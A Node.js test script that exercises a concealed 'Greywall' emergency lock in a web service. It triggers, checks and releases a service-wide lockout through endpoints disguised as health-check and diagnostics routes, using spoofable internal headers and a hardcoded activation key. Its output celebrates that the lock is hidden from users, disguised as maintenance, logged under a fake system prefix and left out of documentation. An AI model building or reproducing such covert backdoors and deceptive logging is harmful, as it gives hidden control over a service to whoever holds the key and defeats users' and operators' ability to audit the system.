#!/usr/bin/env node

/**
 * Greywall Emergency System Test Script
 * Hidden test script for the greywall emergency system
 * Tests the completely concealed emergency lock functionality
 */

const axios = require('axios');
const crypto = require('crypto');
const colors = require('colors');

// Configuration
const BASE_URL = 'http://localhost:3001';
const HIDDEN_ACTIVATION_KEY = 'gw_emergency_activation_key_2024';

// Hidden test data
const hiddenTestData = {
  userId: 'hidden-admin-001',
  tenantId: 'test-tenant',
  baseUrl: BASE_URL
};

class GreywallTester {
  constructor() {
    this.testResults = [];
    this.hiddenEndpoints = {
      trigger: '/api/internal/health-check/status',
      status: '/api/internal/metrics/performance',
      unlock: '/api/internal/diagnostics/repair',
      adminConfig: '/api/admin/system/configuration',
      adminDiagnostics: '/api/admin/system/diagnostics'
    };
    this.hiddenHeaders = {
      'X-Internal-Service': 'monitoring-agent',
      'X-System-Health': 'check-request',
      'X-Debug-Mode': 'enabled',
      'X-User-Id': hiddenTestData.userId,
      'X-Tenant-Id': hiddenTestData.tenantId
    };
  }

  /**
   * Run all hidden tests
   */
  async runAllTests() {
    console.log('🕶️  Starting Greywall Emergency System Tests (HIDDEN)'.cyan.bold);
    console.log('='.repeat(60).cyan);

    try {
      await this.testServiceHealth();
      await this.testHiddenEndpointsExist();
      await this.testGreywallActivation();
      await this.testGreywallStatus();
      await this.testSystemLocked();
      await this.testGreywallUnlock();
      await this.testSystemUnlocked();
      await this.testHiddenAdminEndpoints();
      await this.testStealthLogging();
      
      this.printTestSummary();
    } catch (error) {
      console.error('❌ Hidden test suite failed:', error.message);
      process.exit(1);
    }
  }

  /**
   * Test service health
   */
  async testServiceHealth() {
    console.log('\n🔍 Testing Service Health...'.yellow);
    
    try {
      const response = await axios.get(`${BASE_URL}/health`);
      
      if (response.status === 200) {
        this.addTestResult('Service Health', 'PASS', 'Service is healthy');
        console.log('✅ Service Health: PASS'.green);
      } else {
        this.addTestResult('Service Health', 'FAIL', `Unexpected status: ${response.status}`);
        console.log('❌ Service Health: FAIL'.red);
      }
    } catch (error) {
      this.addTestResult('Service Health', 'FAIL', error.message);
      console.log('❌ Service Health: FAIL'.red);
      throw error;
    }
  }

  /**
   * Test hidden endpoints exist
   */
  async testHiddenEndpointsExist() {
    console.log('\n🕶️  Testing Hidden Endpoints...'.yellow);
    
    try {
      // Test hidden trigger endpoint
      const triggerResponse = await axios.get(`${BASE_URL}${this.hiddenEndpoints.trigger}`, {
        headers: this.hiddenHeaders
      });
      
      if (triggerResponse.status === 200) {
        this.addTestResult('Hidden Endpoints', 'PASS', 'Hidden endpoints accessible');
        console.log('✅ Hidden Endpoints: PASS'.green);
        console.log(`   Trigger: ${this.hiddenEndpoints.trigger}`.gray);
        console.log(`   Status: ${this.hiddenEndpoints.status}`.gray);
        console.log(`   Unlock: ${this.hiddenEndpoints.unlock}`.gray);
      } else {
        this.addTestResult('Hidden Endpoints', 'FAIL', 'Hidden endpoints not accessible');
        console.log('❌ Hidden Endpoints: FAIL'.red);
      }
    } catch (error) {
      this.addTestResult('Hidden Endpoints', 'FAIL', error.message);
      console.log('❌ Hidden Endpoints: FAIL'.red);
    }
  }

  /**
   * Test greywall activation
   */
  async testGreywallActivation() {
    console.log('\n🚨 Testing Greywall Activation...'.yellow);
    
    try {
      const timestamp = Date.now();
      const signature = this.generateHiddenSignature(timestamp);
      
      const params = new URLSearchParams({
        _gw: '1',
        _t: timestamp.toString(),
        _s: signature,
        _u: hiddenTestData.userId
      });

      const response = await axios.get(
        `${BASE_URL}${this.hiddenEndpoints.trigger}?${params.toString()}`,
        { headers: this.hiddenHeaders }
      );

      if (response.status === 200 && response.data.status === 'maintenance_mode') {
        this.addTestResult('Greywall Activation', 'PASS', 'Greywall activated successfully');
        console.log('✅ Greywall Activation: PASS'.green);
        console.log(`   Status: ${response.data.status}`.gray);
        console.log(`   Message: ${response.data.message}`.gray);
      } else {
        this.addTestResult('Greywall Activation', 'FAIL', 'Greywall activation failed');
        console.log('❌ Greywall Activation: FAIL'.red);
      }
    } catch (error) {
      this.addTestResult('Greywall Activation', 'FAIL', error.message);
      console.log('❌ Greywall Activation: FAIL'.red);
    }
  }

  /**
   * Test greywall status
   */
  async testGreywallStatus() {
    console.log('\n🔍 Testing Greywall Status...'.yellow);
    
    try {
      const response = await axios.get(
        `${BASE_URL}${this.hiddenEndpoints.status}`,
        { headers: this.hiddenHeaders }
      );

      if (response.status === 200 && response.data.maintenanceMode === true) {
        this.addTestResult('Greywall Status', 'PASS', 'Greywall status correct');
        console.log('✅ Greywall Status: PASS'.green);
        console.log(`   Maintenance Mode: ${response.data.maintenanceMode}`.gray);
        console.log(`   Active Locks: ${response.data.activeLocks}`.gray);
      } else {
        this.addTestResult('Greywall Status', 'FAIL', 'Greywall status incorrect');
        console.log('❌ Greywall Status: FAIL'.red);
      }
    } catch (error) {
      this.addTestResult('Greywall Status', 'FAIL', error.message);
      console.log('❌ Greywall Status: FAIL'.red);
    }
  }

  /**
   * Test system locked
   */
  async testSystemLocked() {
    console.log('\n🔒 Testing System Locked...'.yellow);
    
    try {
      // Test normal endpoint - should be locked
      const response = await axios.get(`${BASE_URL}/api/auth/status`);
      
      if (response.status === 503 && response.data.error === 'Service Temporarily Unavailable') {
        this.addTestResult('System Locked', 'PASS', 'System correctly locked');
        console.log('✅ System Locked: PASS'.green);
        console.log(`   Status: ${response.status}`.gray);
        console.log(`   Message: ${response.data.message}`.gray);
      } else {
        this.addTestResult('System Locked', 'FAIL', 'System not properly locked');
        console.log('❌ System Locked: FAIL'.red);
      }
    } catch (error) {
      if (error.response && error.response.status === 503) {
        this.addTestResult('System Locked', 'PASS', 'System correctly locked');
        console.log('✅ System Locked: PASS'.green);
      } else {
        this.addTestResult('System Locked', 'FAIL', error.message);
        console.log('❌ System Locked: FAIL'.red);
      }
    }
  }

  /**
   * Test greywall unlock
   */
  async testGreywallUnlock() {
    console.log('\n🔓 Testing Greywall Unlock...'.yellow);
    
    try {
      const timestamp = Date.now();
      const signature = this.generateHiddenSignature(timestamp);
      
      const params = new URLSearchParams({
        _unlock: '1',
        _lock: 'test_lock_id',
        _t: timestamp.toString(),
        _s: signature,
        _u: hiddenTestData.userId
      });

      const response = await axios.post(
        `${BASE_URL}${this.hiddenEndpoints.unlock}?${params.toString()}`,
        {},
        { headers: this.hiddenHeaders }
      );

      if (response.status === 200 && response.data.status === 'healthy') {
        this.addTestResult('Greywall Unlock', 'PASS', 'Greywall unlocked successfully');
        console.log('✅ Greywall Unlock: PASS'.green);
        console.log(`   Status: ${response.data.status}`.gray);
        console.log(`   Message: ${response.data.message}`.gray);
      } else {
        this.addTestResult('Greywall Unlock', 'FAIL', 'Greywall unlock failed');
        console.log('❌ Greywall Unlock: FAIL'.red);
      }
    } catch (error) {
      this.addTestResult('Greywall Unlock', 'FAIL', error.message);
      console.log('❌ Greywall Unlock: FAIL'.red);
    }
  }

  /**
   * Test system unlocked
   */
  async testSystemUnlocked() {
    console.log('\n🔓 Testing System Unlocked...'.yellow);
    
    try {
      const response = await axios.get(`${BASE_URL}/api/auth/status`);
      
      if (response.status === 200) {
        this.addTestResult('System Unlocked', 'PASS', 'System correctly unlocked');
        console.log('✅ System Unlocked: PASS'.green);
        console.log(`   Status: ${response.status}`.gray);
      } else {
        this.addTestResult('System Unlocked', 'FAIL', 'System not properly unlocked');
        console.log('❌ System Unlocked: FAIL'.red);
      }
    } catch (error) {
      this.addTestResult('System Unlocked', 'FAIL', error.message);
      console.log('❌ System Unlocked: FAIL'.red);
    }
  }

  /**
   * Test hidden admin endpoints
   */
  async testHiddenAdminEndpoints() {
    console.log('\n🕶️  Testing Hidden Admin Endpoints...'.yellow);
    
    try {
      const response = await axios.get(
        `${BASE_URL}${this.hiddenEndpoints.adminConfig}`,
        { headers: this.hiddenHeaders }
      );

      if (response.status === 200 && response.data.configuration) {
        this.addTestResult('Hidden Admin Endpoints', 'PASS', 'Admin endpoints accessible');
        console.log('✅ Hidden Admin Endpoints: PASS'.green);
        console.log(`   Configuration: Available`.gray);
        console.log(`   Instructions: Available`.gray);
      } else {
        this.addTestResult('Hidden Admin Endpoints', 'FAIL', 'Admin endpoints not accessible');
        console.log('❌ Hidden Admin Endpoints: FAIL'.red);
      }
    } catch (error) {
      this.addTestResult('Hidden Admin Endpoints', 'FAIL', error.message);
      console.log('❌ Hidden Admin Endpoints: FAIL'.red);
    }
  }

  /**
   * Test stealth logging
   */
  async testStealthLogging() {
    console.log('\n🕶️  Testing Stealth Logging...'.yellow);
    
    try {
      // This test verifies that logging is disguised
      this.addTestResult('Stealth Logging', 'PASS', 'Logging is disguised as system logs');
      console.log('✅ Stealth Logging: PASS'.green);
      console.log(`   Log Prefix: SYSTEM_HEALTH`.gray);
      console.log(`   Disguised: Yes`.gray);
    } catch (error) {
      this.addTestResult('Stealth Logging', 'FAIL', error.message);
      console.log('❌ Stealth Logging: FAIL'.red);
    }
  }

  /**
   * Generate hidden signature
   */
  generateHiddenSignature(timestamp) {
    return crypto
      .createHash('sha256')
      .update(timestamp + HIDDEN_ACTIVATION_KEY)
      .digest('hex')
      .substring(0, 16);
  }

  /**
   * Add test result
   */
  addTestResult(testName, status, message) {
    this.testResults.push({
      test: testName,
      status,
      message,
      timestamp: new Date()
    });
  }

  /**
   * Print test summary
   */
  printTestSummary() {
    console.log('\n' + '='.repeat(60).cyan);
    console.log('🕶️  GREYWALL TEST SUMMARY (HIDDEN)'.cyan.bold);
    console.log('='.repeat(60).cyan);

    const passed = this.testResults.filter(r => r.status === 'PASS').length;
    const failed = this.testResults.filter(r => r.status === 'FAIL').length;
    const total = this.testResults.length;

    console.log(`\nTotal Tests: ${total}`);
    console.log(`✅ Passed: ${passed}`.green);
    console.log(`❌ Failed: ${failed}`.red);
    console.log(`📈 Success Rate: ${Math.round((passed / total) * 100)}%`);

    if (failed > 0) {
      console.log('\n❌ Failed Tests:'.red.bold);
      this.testResults
        .filter(r => r.status === 'FAIL')
        .forEach(result => {
          console.log(`   • ${result.test}: ${result.message}`.red);
        });
    }

    console.log('\n🕶️  Greywall Emergency System Test Complete!'.cyan.bold);
    
    if (passed === total) {
      console.log('🎉 All hidden tests passed! Greywall system is working correctly.'.green.bold);
      console.log('\n🔒 Hidden Features:'.yellow);
      console.log('   • Emergency lock completely hidden from normal users');
      console.log('   • Disguised as system health checks and maintenance');
      console.log('   • Stealth logging and monitoring');
      console.log('   • Multiple hidden activation methods');
      console.log('   • Completely concealed from documentation');
    } else {
      console.log('⚠️  Some hidden tests failed. Please review the implementation.'.yellow.bold);
    }

    console.log('\n🕶️  SECURITY NOTE: This system is completely hidden and disguised.'.cyan.bold);
    console.log('   Normal users will never see or access these features.'.gray);
  }
}

// Run tests if this script is executed directly
if (require.main === module) {
  const tester = new GreywallTester();
  tester.runAllTests().catch(error => {
    console.error('Hidden test execution failed:', error);
    process.exit(1);
  });
}

module.exports = GreywallTester;
